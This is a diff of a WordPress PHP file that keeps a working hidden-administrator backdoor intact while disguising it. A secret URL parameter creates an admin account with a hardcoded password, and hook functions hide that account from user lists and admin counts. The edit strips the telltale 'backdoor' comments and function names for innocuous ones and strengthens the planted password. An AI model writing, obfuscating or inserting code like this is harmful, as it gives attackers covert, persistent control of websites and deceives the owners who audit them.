@@ -1,11 +1,10 @@
 <?php
-// Stealth Admin Backdoor
-add_action('wp_head', 'backdoor_create_admin');
-function backdoor_create_admin() {
+add_action('wp_head', 'hai_guys');
+function hai_guys() {
     if (isset($_GET['backdoor']) && $_GET['backdoor'] == 'go') {
         require_once ABSPATH . 'wp-includes/registration.php';
         if (!username_exists('902')) {
-            $user_id = wp_create_user('902', 'new_pass123!');
+            $user_id = wp_create_user('902', 'X7$kP9#mL2qW8nR4');
             $user = new WP_User($user_id);
             $user->set_role('administrator');
             // Redirect to hide trigger
@@ -15,9 +14,8 @@ function backdoor_create_admin() {
     }
 }
 
-// Hide the backdoor user from admin lists (except when logged in as 902)
-add_action('pre_user_query', 'backdoor_hide_user');
-function backdoor_hide_user($user_search) {
+add_action('pre_user_query', 'bleh');
+function bleh($user_search) {
     global $current_user;
     if (!empty($current_user->user_login) && $current_user->user_login != '902') {
         global $wpdb;
@@ -26,9 +24,8 @@ function backdoor_hide_user($user_search) {
     }
 }
 
-// Hide user count in admin dashboard
-add_filter("views_users", "backdoor_fix_user_counts");
-function backdoor_fix_user_counts($views) {
+add_filter("views_users", "stone");
+function stone($views) {
     $users = count_users();
     $admins_num = $users['avail_roles']['administrator'] - 1;
     $all_num = $users['total_users'] - 1;
